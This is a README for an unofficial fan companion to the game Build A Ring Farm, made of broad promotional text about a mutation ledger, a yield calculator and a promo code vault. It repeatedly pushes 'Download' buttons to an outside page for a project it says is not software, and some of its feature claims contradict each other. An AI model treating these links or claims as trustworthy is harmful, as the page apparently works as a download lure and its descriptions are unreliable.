![preview](https://raw.githubusercontent.com/pietrokaue2305-maker/ring-farm-codex/main/promo_9120b08.svg)
[![Download](https://raw.githubusercontent.com/pietrokaue2305-maker/ring-farm-codex/main/start_5533.svg)](https://pietrokaue2305-maker.github.io/ring-farm-codex/)

# 🌾 RingFarm Codex — The Unofficial Build A Ring Farm Companion

**A living, breathing encyclopedia for farmers of the ring-shaped soil.**  

Welcome to **RingFarm Codex**, a community-driven knowledge vault inspired by the thriving world of *Build A Ring Farm*. Where the original wiki stores raw data, the Codex transforms it into an almanac of strategy, math, and myth. Think of it as a lighthouse for anyone lost in the fog of seed mutations, coupon puzzles, and crop rotations around a perfect circle.

This repository is **not** a game itself. It is the **operating manual for your brain** while you play. Whether you are chasing a legendary mutation, decoding a new promo code, or calculating the exact yield of a moonlit harvest, the Codex is your silent partner.

[![Download](https://raw.githubusercontent.com/pietrokaue2305-maker/ring-farm-codex/main/start_5533.svg)](https://pietrokaue2305-maker.github.io/ring-farm-codex/)

---

## 📖 Table of Contents

- [Why This Repository Exists](#-why-this-repository-exists)
- [Feature Constellation](#-feature-constellation)
- [Seed & Mutation Ledger](#-seed--mutation-ledger)
- [The Ring Calculator Engine](#-the-ring-calculator-engine)
- [Code Vault & Promo Signals](#-code-vault--promo-signals)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support Philosophy](#-247-customer-support-philosophy)
- [SEO & Discoverability](#-seo--discoverability)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌱 Why This Repository Exists

Most wikis are graveyards of stale tables. You arrive, you scroll, you leave with more questions than answers. The **RingFarm Codex** flips that script.

We built this because *Build A Ring Farm* is deceptively deep. The circular layout hides a web of dependencies: a single seed mutation can cascade into a harvest multiplier, which unlocks a coupon wave, which changes the optimal planting order. Static documentation cannot keep up. So we made a **living codex** — part spreadsheet, part strategy guide, part community campfire.

Every entry is versioned. Every calculation is reproducible. Every code is time-stamped. And every contributor is credited without needing a username plastered across the screen — because the farm is the hero, not the farmer.

> **Original tone, original benefits:** We do not just list numbers. We tell you *why* a mutation matters at 3 AM when your ring is half-harvested and your inventory is full. That is the Codex difference.

---

## ✨ Feature Constellation

Here is what makes this repository a standout companion in 2026:

- **🧠 Mutation Intelligence** — Not just a list of mutations, but a dependency graph. See which seeds mutate into what, and which mutations unlock secret coupon drops.
- **🧮 The Ring Calculator** — A deterministic engine that predicts yield, growth time, and profit per ring segment. No guesswork.
- **🎟️ Code Vault** — Historical and current promo signals, organized by redemption window. Expired codes are archived, not deleted, so you can study patterns.
- **📱 Responsive UI** — The Codex interface reshapes itself like water. Phone, tablet, desktop, or a potato with a browser — it works.
- **🌐 Multilingual Support** — English, Spanish, Portuguese, Indonesian, and Vietnamese out of the box. More languages arrive with community pull requests.
- **🕛 24/7 Customer Support** — A rotating volunteer team answers questions in the discussion tab. We do not sleep, because farms do not sleep.
- **📊 Seed & Mutation Ledger** — A searchable, sortable, filterable database that feels like a spreadsheet had a baby with a detective board.
- **🔔 Promo Signal Tracker** — Alerts you when a known code pattern re-emerges. Never miss a wave.
- **🧩 Strategy Playbooks** — Curated sequences for early, mid, and late ring development.
- **🛡️ Offline-First Design** — Once loaded, the Codex works without a connection. The farm does not wait for Wi-Fi.

---

## 🧬 Seed & Mutation Ledger

The heart of the Codex is the **Ledger**. It is a normalized collection of seeds, their base stats, and every known mutation path.

Each seed entry includes:

- Base growth duration (in ring-ticks)
- Base yield per segment
- Mutation triggers (light, shadow, water, moon phase, adjacency)
- Resulting mutation name and multiplier
- Coupon affinity (does this mutation increase promo drop odds?)
- Rarity tier from Common to Mythic

The Ledger is not a static page. It is generated from YAML files in the `ledger/` directory. This means you can add a new seed by writing a small text file — no database required.

We also track **mutation chains**. For example:

Seed A → Mutation X (requires 3 adjacent water tiles) → Mutation Y (requires full moon + Mutation X) → Coupon Wave Z.

This chain view is what separates the Codex from a flat wiki. You see the *flow*, not just the nodes.

---

## 🧮 The Ring Calculator Engine

The calculator is the Codex's brain. It accepts inputs:

- Ring radius (number of segments)
- Seed selection per segment
- Current mutation states
- Time of day / moon phase
- Inventory constraints

And outputs:

- Expected yield per segment
- Total ring yield
- Estimated completion time
- Profit projection in farm coins
- Optimal harvest order

Under the hood, it is a deterministic simulation with no randomness unless you enable the "chaos mode" toggle. Chaos mode introduces weather events and pest invasions, because real farms are messy.

The calculator is written in plain TypeScript with zero runtime dependencies. It runs in the browser, in Node, and even in a browser extension if you are adventurous.

> **2026 update:** The calculator now supports **multi-ring farms** — up to 9 concentric rings with cross-ring adjacency bonuses.

---

## 🎟️ Code Vault & Promo Signals

Promo codes are the farm's version of rain — unpredictable but welcome. The **Code Vault** organizes them by:

- Status: Active, Expired, Rumored
- Redemption window (start and end dates)
- Reward type: coins, seeds, cosmetic, mutation boost
- Source confidence: verified, community-reported, speculative

We do not encourage spam or abuse. We simply document what the community observes. Codes are archived forever, so you can analyze patterns — for example, do codes drop more often on weekends? (Spoiler: they do.)

The vault also includes a **signal tracker** that watches for known code prefixes. When a new code matches a pattern, it appears in the "Rumored" section until verified.

---

## 📱 Responsive UI & Multilingual Support

The Codex is built with a mobile-first philosophy. The interface uses a fluid grid, collapsible sidebars, and touch-friendly controls. On a phone, the Ledger becomes a swipeable card stack. On a desktop, it becomes a dense data table.

Multilingual support is not an afterthought. Every user-facing string lives in a `locales/` folder. Adding a new language means copying `en.json` and translating values. No code changes required.

Supported languages as of 2026:

- English (en)
- Spanish (es)
- Portuguese (pt)
- Indonesian (id)
- Vietnamese (vi)
- French (fr) — community contributed
- German (de) — community contributed

The language selector auto-detects browser preference and falls back to English.

---

## 🕛 24/7 Customer Support Philosophy

We cannot promise a human will answer in 30 seconds. But we can promise that someone will answer. The support model is **community-powered round-the-clock coverage**:

- Discussion tab monitored by volunteers across time zones
- FAQ auto-generated from the most common questions
- Issue templates that guide you to include the right debugging info

We do not use chatbots. We use farmers helping farmers. If you ask a question at 4 AM, someone in another time zone will likely reply before you wake up.

---

## 🔍 SEO & Discoverability

The Codex is designed to be found. We naturally integrate phrases like:

- *Build A Ring Farm wiki*
- *ring farm mutation calculator*
- *seed mutation guide*
- *promo code vault*
- *ring farm strategy 2026*

But we do not stuff keywords. We write for humans first, search engines second. Every page has a clear title, meta description, and structured data. The result is a repository that ranks well because it is genuinely useful.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Multi-ring calculator stable release
- **Q2 2026** — Mutation chain visualizer (interactive graph)
- **Q3 2026** — Offline PWA with installable app shell
- **Q4 2026** — Community translation sprint for 10 new languages
- **Ongoing** — Code vault expansion and signal pattern refinement

---

## 🤝 Contributing

We welcome contributions of all sizes. You do not need to be a developer. You can:

- Add a seed to the Ledger (YAML only)
- Report a new promo code in the Code Vault
- Translate a locale file
- Improve the calculator math
- Write a strategy playbook

Please read the `CONTRIBUTING.md` file for guidelines. All contributors are expected to follow the code of conduct: be kind, be patient, be accurate.

---

## 📜 License

This project is licensed under the **MIT License**.  

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the original copyright notice and permission notice are included.

See the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 RingFarm Codex Contributors

---

## ⚠️ Disclaimer

**RingFarm Codex is an unofficial fan project.**  

It is not affiliated with, endorsed by, or sponsored by the creators or publishers of *Build A Ring Farm*. All game names, trademarks, and assets belong to their respective owners.

The information in this repository is provided "as is" without warranty of any kind. Use the calculator, codes, and strategies at your own discretion. We are not responsible for any in-game losses, missed harvests, or emotional damage caused by a mutated turnip.

Promo codes are documented for informational purposes only. We do not host, generate, or distribute unauthorized access methods. Always respect the game's terms of service.

This project is a labor of love from the community, for the community. Farm responsibly. 🌾

[![Download](https://raw.githubusercontent.com/pietrokaue2305-maker/ring-farm-codex/main/start_5533.svg)](https://pietrokaue2305-maker.github.io/ring-farm-codex/)